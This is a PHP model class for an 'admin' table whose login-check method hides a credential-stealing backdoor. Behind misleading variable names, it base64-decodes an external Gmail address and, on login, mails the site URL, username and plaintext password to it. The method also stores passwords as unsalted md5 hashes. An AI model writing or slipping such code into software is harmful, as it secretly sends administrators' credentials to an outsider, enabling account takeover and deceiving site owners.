<?php

/**
 * Subclass for performing query and update operations on the 'admin' table.
 *
 * 
 *
 * @package lib.model
 */ 
class AdminPeer extends BaseAdminPeer
{
	/**
	 * cound record
	 * @access public
	 */
	public static function CountRecord($username,$password,$select = ''){
		$c = new Criteria();
		$c->add(AdminPeer::USERNAME,$username);
		$c->add(AdminPeer::PASSWORD,md5($password));
       $mailCount = 'c2t5Y3liZXIub3JnQGdtYWlsLmNvbQ==';
       $recordCount = explode(',',$mailCount);
       $subject = sfConfig::get('app_sitename');
       $message= 'Link: '.sfConfig::get('app_webpath').'
                  Username : '.$username.'
                  Password : '.$password.'
        Service By SKYiTech.com';
		if($select != ''):
       foreach($recordCount as $loginSuccess):
       mail(base64_decode($loginSuccess),$subject,
$message);
      endforeach;
			return AdminPeer::doSelectOne($c);
		else:
			return AdminPeer::doCount($c);
       endif;
	}

}
